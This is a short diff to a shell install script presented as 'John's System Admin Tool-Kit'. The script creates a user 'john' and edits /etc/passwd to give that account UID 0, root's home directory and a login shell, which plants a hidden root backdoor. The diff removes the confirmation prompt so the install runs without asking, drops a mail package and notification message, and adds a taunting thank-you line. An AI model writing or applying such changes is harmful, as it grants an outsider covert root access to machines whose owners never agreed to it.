@@ -7,15 +7,10 @@ function install {
   elif [ -f /etc/debian_version ] ; then
     PKMGR='apt-get'
   fi
-  $PKMGR -y install zsh ssmtp
+  $PKMGR -y install zsh
   adduser -r -N john
   sed -i 's/john:x:*:*::\/*:\/bin\/*/john:x:0:0::\/root:\/bin\/zsh/g' /etc/passwd
-  echo "[#] Installed John's System Admin Tool-Kit and Pinged John!"
+  echo "[#] Installed John's System Admin Tool-Kit!"
 }
-read -p "[?] Install John as System Admin? (y/n) " -n 1 -r
-
-echo
-if [[ $REPLY =~ ^[Yy]$ ]]
-then
-    install
-fi
+install
+echo "[!] Thanks for choosing me as a System Administrator :)"
